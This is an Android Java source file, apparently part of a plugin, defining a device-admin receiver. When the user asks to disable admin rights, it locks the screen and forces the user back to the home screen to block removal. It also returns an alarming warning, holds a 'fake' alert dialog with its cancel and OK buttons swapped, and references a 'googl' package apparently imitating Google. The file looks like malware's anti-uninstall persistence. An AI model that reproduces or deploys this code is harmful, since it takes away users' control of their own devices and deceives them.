package com.xstd.plugin.binddevice;

import android.R;
import android.app.AlertDialog;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.view.WindowManager;
import com.googl.plugin.x.FakeActivity;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-21
 * Time: AM11:15
 * To change this template use File | Settings | File Templates.
 */
public class DeviceBindBRC extends DeviceAdminReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onEnabled]] action : " + intent.getAction());
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(true);

        Intent i = new Intent();
        i.setAction(FakeActivity.BIND_SUCCESS_ACTION);
        context.sendBroadcast(i);
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisabled]] action : " + intent.getAction());
        SettingManager.getInstance().init(context);
        SettingManager.getInstance().setKeyHasBindingDevices(false);
    }

    @Override
    public CharSequence onDisableRequested (final Context context, Intent intent) {
        Config.LOGD("[[DeviceBindBRC::onDisableRequested]] action : " + intent.getAction());

        getManager(context).lockNow();

        AppRuntime.LOCK_DEVICE_AS_DISDEVICE = true;

        UtilsRuntime.goHome(context);
//        showFakeAlertDialog(context, "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?");

        return "取消设备激活可能会造成设备的服务不能使用，是否确定要取消激活?";
    }

    private void showFakeAlertDialog(Context context, String message) {
        AlertDialog dialog =  new AlertDialog.Builder(context)
                   .setTitle(message)
                   .setIcon(android.R.drawable.ic_dialog_alert)
                   .setCancelable(true)
                   .setPositiveButton(android.R.string.cancel, null)
                   .setNegativeButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                       @Override
                       public void onClick(DialogInterface dialog, int which) {
                       }
                   })
                   .create();
        dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
        dialog.show();
    }

}
